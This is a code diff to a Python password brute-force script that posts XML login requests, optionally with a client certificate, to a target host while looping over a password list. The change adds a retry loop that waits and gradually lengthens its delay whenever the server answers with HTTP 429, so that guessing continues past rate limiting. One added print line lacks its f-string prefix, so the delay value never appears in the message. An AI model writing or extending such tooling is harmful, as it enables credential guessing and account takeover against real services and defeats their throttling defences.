@@ -3,7 +3,7 @@
 from argparse import ArgumentParser
 import json
 import datetime
-
+from time import sleep
 from requests import post
 from requests_pkcs12 import post as post_pkcs12
 
@@ -159,6 +159,8 @@ error_msg = "Incorrect username or password."
   
 print("! Starting the bruteforce ...\n")
 
+delay = 0.01
+
 for passwd in passwords:
 
     passwd = passwd.strip()
@@ -176,7 +178,16 @@ for passwd in passwords:
         response = post_pkcs12(HOST, data=xml, pkcs12_filename=CLIENT_CERT_P12, pkcs12_password=CLIENT_CERT_P12_PASSWORD)
     else:
         response = post(HOST, data=xml)
-    
+
+    while response.status_code == 429:
+        print("\n* Too many requests. Waiting {delay} seconds ...")
+        sleep(delay)
+        if CLIENT_CERT_P12:
+            response = post_pkcs12(HOST, data=xml, pkcs12_filename=CLIENT_CERT_P12, pkcs12_password=CLIENT_CERT_P12_PASSWORD)
+        else:
+            response = post(HOST, data=xml)
+        delay += 0.01
+        
     content = response.text
     
     occ = 0
